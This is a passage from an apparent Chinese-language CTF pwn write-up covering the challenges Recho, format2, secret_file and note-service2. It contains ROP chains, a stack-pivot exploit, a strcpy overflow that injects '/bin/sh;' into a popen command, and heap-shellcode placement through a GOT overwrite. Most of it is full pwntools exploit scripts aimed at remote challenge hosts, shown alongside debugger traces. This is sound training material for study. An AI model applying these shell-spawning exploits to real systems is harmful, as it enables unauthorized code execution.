+= p64(addr_rdi)</span><br><span class="line">pd += p64(addr_flag)</span><br><span class="line">pd += p64(addr_rax)</span><br><span class="line">pd += p64(<span class="number">2</span>)</span><br><span class="line">pd += p64(plt_alarm)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make read</span></span><br><span class="line">pd += p64(addr_rsi_r15)</span><br><span class="line">pd += p64(addr_bss)</span><br><span class="line">pd += p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(addr_rdx)</span><br><span class="line">pd += p64(<span class="number">0x30</span>)</span><br><span class="line">pd += p64(addr_rdi)</span><br><span class="line">pd += p64(<span class="number">3</span>)</span><br><span class="line">pd += p64(addr_rax)</span><br><span class="line">pd += p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(plt_alarm)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make write</span></span><br><span class="line">pd += p64(addr_rsi_r15)</span><br><span class="line">pd += p64(addr_bss)</span><br><span class="line">pd += p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(addr_rdx)</span><br><span class="line">pd += p64(<span class="number">0x30</span>)</span><br><span class="line">pd += p64(addr_rdi)</span><br><span class="line">pd += p64(<span class="number">1</span>)</span><br><span class="line">pd += p64(addr_rax)</span><br><span class="line">pd += p64(<span class="number">1</span>)</span><br><span class="line">pd += p64(plt_alarm)</span><br><span class="line">p.sendafter(<span class="string">'Welcome to Recho server!\n'</span>, str(len(pd)))</span><br><span class="line">p.send(pd)</span><br><span class="line">p.shutdown()</span><br><span class="line">p.recv(<span class="number">0x2a</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="format2"><a href="#format2" class="headerlink" title="format2"></a>format2</h2><h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>你能从这个服务器获得身份验证吗？</p>
</blockquote>
<hr>
<h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution:"></a>Solution:</h3><p>静态链接的文件，可以看到出题人写了后门</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">correct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( input == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulation! you are good!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里存在栈迁移的漏洞，因为 input 变量能写 12 个字符，可以通过 v4 变量覆盖到 auth 函数的 ebp 上</p>
<p>然后经过两次 leave 函数就能将 esp 改到漏洞点的位置</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __<span class="function">cdecl <span class="title">auth</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *s2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v4, &amp;input, a1);</span><br><span class="line">  s2 = calc_md5(&amp;v2, <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hash : %s\n"</span>, s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是 exp 演示，注意观察 ebp 和 esp</p>
<p><strong>step1：</strong></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">EBP</span>  <span class="number">0xffd2fe48</span> → <span class="number">0x811eb40</span> (input) ← <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</span><br><span class="line"> <span class="built_in">ESP</span>  <span class="number">0xffd2fe20</span> → <span class="number">0x80da684</span> ← <span class="keyword">cmp</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>], <span class="number">dh</span> /* <span class="string">'f87cd601aa7fedca99018a8be88eda34'</span> */</span><br><span class="line"> <span class="built_in">EIP</span>  <span class="number">0x804930b</span> (auth+<span class="number">111</span>) → <span class="keyword">leave</span>  </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x804930b</span> &lt;auth+<span class="number">111</span>&gt;      <span class="keyword">leave</span>  </span><br><span class="line">   <span class="number">0x804930c</span> &lt;auth+<span class="number">112</span>&gt;      <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p><strong>step2：</strong></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">EBP</span>  <span class="number">0x811eb40</span> (input) ← <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</span><br><span class="line"> <span class="built_in">ESP</span>  <span class="number">0xffd2fe4c</span> → <span class="number">0x8049407</span> (main+<span class="number">250</span>) ← <span class="keyword">cmp</span>    <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"> <span class="built_in">EIP</span>  <span class="number">0x804930c</span> (auth+<span class="number">112</span>) ← <span class="keyword">ret</span>    </span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x804930b</span> &lt;auth+<span class="number">111</span>&gt;      <span class="keyword">leave</span>  </span><br><span class="line"> ► <span class="number">0x804930c</span> &lt;auth+<span class="number">112</span>&gt;      <span class="keyword">ret</span>             &lt;<span class="number">0x8049407</span><span class="comment">; main+250&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>step3：</strong></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">EBP</span>  <span class="number">0x811eb40</span> (input) ← <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</span><br><span class="line"> <span class="built_in">ESP</span>  <span class="number">0xffd2fe50</span> ← <span class="number">0xc</span> /* <span class="string">'\x0c'</span> */</span><br><span class="line"> <span class="built_in">EIP</span>  <span class="number">0x8049424</span> (main+<span class="number">279</span>) ← <span class="keyword">leave</span>  </span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x804930b</span> &lt;auth+<span class="number">111</span>&gt;      <span class="keyword">leave</span>  </span><br><span class="line">   <span class="number">0x804930c</span> &lt;auth+<span class="number">112</span>&gt;      <span class="keyword">ret</span>    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8049407</span> &lt;main+<span class="number">250</span>&gt;      <span class="keyword">cmp</span>    <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line">   <span class="number">0x804940a</span> &lt;main+<span class="number">253</span>&gt;      <span class="keyword">jne</span>    main+<span class="number">274</span> &lt;<span class="number">0x804941f</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x804941f</span> &lt;main+<span class="number">274</span>&gt;      <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x8049424</span> &lt;main+<span class="number">279</span>&gt;      <span class="keyword">leave</span>  </span><br><span class="line">   <span class="number">0x8049425</span> &lt;main+<span class="number">280</span>&gt;      <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p><strong>step4：</strong></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">EBP</span>  <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</span><br><span class="line"> <span class="built_in">ESP</span>  <span class="number">0x811eb44</span> (input+<span class="number">4</span>) → <span class="number">0x8049284</span> (correct+<span class="number">37</span>) ← <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], <span class="number">0x80da66f</span></span><br><span class="line"> <span class="built_in">EIP</span>  <span class="number">0x8049425</span> (main+<span class="number">280</span>) ← <span class="keyword">ret</span>    </span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x804930c</span> &lt;auth+<span class="number">112</span>&gt;      <span class="keyword">ret</span>    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8049407</span> &lt;main+<span class="number">250</span>&gt;      <span class="keyword">cmp</span>    <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line">   <span class="number">0x804940a</span> &lt;main+<span class="number">253</span>&gt;      <span class="keyword">jne</span>    main+<span class="number">274</span> &lt;<span class="number">0x804941f</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x804941f</span> &lt;main+<span class="number">274</span>&gt;      <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x8049424</span> &lt;main+<span class="number">279</span>&gt;      <span class="keyword">leave</span>  </span><br><span class="line"> ► <span class="number">0x8049425</span> &lt;main+<span class="number">280</span>&gt;      <span class="keyword">ret</span>             &lt;<span class="number">0x8049284</span><span class="comment">; correct+37&gt;</span></span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8049284</span> &lt;correct+<span class="number">37</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], <span class="number">0x80da66f</span></span><br><span class="line">   <span class="number">0x804928b</span> &lt;correct+<span class="number">44</span>&gt;    <span class="keyword">call</span>   system &lt;<span class="number">0x805b2b0</span>&gt;</span><br></pre></td></tr></table></figure>

<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="i386", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./format2'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">38083</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x080492BA\nb *0x804941F\nc")</span></span><br><span class="line">addr_system = <span class="number">0x08049284</span></span><br><span class="line">addr_input = <span class="number">0x0811EB40</span></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">4</span></span><br><span class="line">pd += p32(addr_system)</span><br><span class="line">pd += p32(addr_input)</span><br><span class="line">p.sendlineafter(<span class="string">'Authenticate : '</span>, base64.b64encode(pd))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-8"><a href="#Flag-8" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="secret-file"><a href="#secret-file" class="headerlink" title="secret_file"></a>secret_file</h2><h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>机密</p>
</blockquote>
<hr>
<h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution:"></a>Solution:</h3><p>主要函数如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  FILE *v9; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-308h]</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-300h]</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-2F8h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+110h] [rbp-1F8h]</span></span><br><span class="line">  _BYTE v15[<span class="number">5</span>]; <span class="comment">// [rsp+12Bh] [rbp-1DDh] v15 在经过 sub_E60 函数后</span></span><br><span class="line">                <span class="comment">//                       被赋值为了 9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+16Ch] [rbp-19Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+18Ch] [rbp-17Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+1CCh] [rbp-13Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1D0h] [rbp-138h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v20; <span class="comment">// [rsp+2D8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v20 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_E60(&amp;dest);</span><br><span class="line">  v11 = <span class="number">0L</span>L;</span><br><span class="line">  lineptr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( getline(&amp;lineptr, &amp;v11, <span class="built_in">stdin</span>) == <span class="number">-1</span> )   <span class="comment">// 这里可以输入超长的字符串只要你不输入回车</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">strrchr</span>(lineptr, <span class="number">10</span>);                    <span class="comment">// 找回车符，并将回车符及其后面的字符串放到 v3 中</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  *v3 = <span class="number">0</span>;                                      <span class="comment">// 把以回车符为开头的字符串的回车符开头变成空字符，这样 lineptr 就截断到回车符了</span></span><br><span class="line">  v4 = &amp;v16;</span><br><span class="line">  v5 = &amp;v17;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, lineptr);                       <span class="comment">// 将 lineptr 上面的字符串复制到 dest 里面，可以造成溢出</span></span><br><span class="line">  sub_DD0(&amp;dest, &amp;v16, <span class="number">0x100</span>u);                 <span class="comment">// 这里将 dest 的前 0x100 个字符作为要加密的数据，进行 SHA256 加密，存到 v16 里</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *v4;</span><br><span class="line">    v7 = v5;                                    <span class="comment">// 这个 do while 循环将 v16 的字符转换成 16 进制存到了 v17 里</span></span><br><span class="line">    v5 = (v5 + <span class="number">2</span>);</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">snprintf</span>(v7, <span class="number">3u</span>LL, <span class="string">"%02x"</span>, v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != &amp;v18 );</span><br><span class="line">  v8 = <span class="built_in">strcmp</span>(v15, &amp;v17);                       <span class="comment">// 这里 v15 和 v17 相等才能执行 popen</span></span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong password!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = popen(&amp;v14, <span class="string">"r"</span>);                        <span class="comment">// 利用 dest 在 v14 地址处写上 /bin/sh</span></span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( fgets(&amp;s, <span class="number">256</span>, v9) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;s);</span><br><span class="line">  fclose(v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>靠 dest 覆盖 v14 为 <code>/bin/sh;</code> 后面用空格补充，因为<code>shell</code>中空格没啥用</p>
<p>覆盖 v15 为自己之前输入的 0x100 个 ‘a’ 的 SHA256 十六进制值，这样检测就能绕过</p>
<p>最后要改一下重定向，这样才会显示命令成功执行后的结果</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="amd64", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./secret_file'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">34000</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *$rebase(0xB59)\nc")</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *$rebase(0xBd5)\nc")</span></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x100</span></span><br><span class="line">pd += <span class="string">'/bin/sh;'</span> + <span class="string">' '</span> * <span class="number">19</span></span><br><span class="line">pd += hashlib.sha256(<span class="string">'a'</span> * <span class="number">0x100</span>).hexdigest()</span><br><span class="line">p.sendline(pd)</span><br><span class="line">p.sendline(<span class="string">'exec 1&gt;&amp;0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-9"><a href="#Flag-9" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h2><h3 id="Description-10"><a href="#Description-10" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution:"></a>Solution:</h3><p>第一次接触这种题，记录下来，技术点是<code>在堆上布置 shellcode</code></p>
<p>程序只有 add 和 delete 可以用，add 函数在选择下标的时候没有做检测，导致可以利用数组进行任意地址改写</p>
<p>程序关闭了 NX 保护，说明是让我们执行 shellcode 来进行提权</p>
<p>这里的重点就是 shellcode 很长，但是这个程序的 add 功能最多只能在堆里写入 7 个字符，剩下的一个会被空字符补上</p>
<p>所以我们在布置 shellcode 的时候只能一条汇编一条汇编地写入，在执行 atoi 函数的时候我们可以看到以下汇编</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000000BB4                 <span class="keyword">call</span>    input_n</span><br><span class="line"><span class="symbol">.text:</span>0000000000000BB9                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+nptr]</span><br><span class="line"><span class="symbol">.text:</span>0000000000000BBD                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; nptr</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000BC0                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000BC5                 <span class="keyword">call</span>    _atoi</span><br></pre></td></tr></table></figure>

<p>所以最后输入<code>/bin/sh</code>就能使 rdi 得到 shellcode 需要的字符串地址，剩下的在堆内写入相应的汇编即可</p>
<p>问题在于如何跳转，我们可以使用<code>jmp short xxx</code> ⇔ <code>\xEB\xHH</code>(\xHH == xxx)</p>
<p><strong>xxx = 目标地址 - 当前地址 - 2</strong></p>
<p>这是堆内排布</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="number">0x562aa86e7000</span></span><br><span class="line"><span class="number">0x562aa86e7000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x562aa86e7010</span>:	<span class="number">0x0019eb9090909090</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x562aa86e7020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x562aa86e7030</span>:	<span class="number">0x0019eb0000003bb8</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x562aa86e7040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x562aa86e7050</span>:	<span class="number">0x0019eb9090f63148</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x562aa86e7060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x562aa86e7070</span>:	<span class="number">0x0019eb9090d23148</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x562aa86e7080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x562aa86e7090</span>:	<span class="number">0x000000000000050f</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>\xEB\x19</code>离下一个指令的位置差了<code>0x1B</code>，这个<code>\x19</code>的是这么来的</p>
<p><strong>0x1B - 2 == 0x19</strong></p>
<p>之后 free 掉下标为 0 的堆块，在 got_atoi 处新建一个堆块，那么 got_atoi 的地址上就存入了堆块的地址</p>
<p>最后调用 atoi 函数时，就会进入堆块执行 shellcode 获取权限</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./note-service2'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">37262</span>)</span><br><span class="line">got_atoi = <span class="number">0x202060</span></span><br><span class="line">addr_chunk_list = <span class="number">0x2020A0</span></span><br><span class="line"></span><br><span class="line"></span><br><span 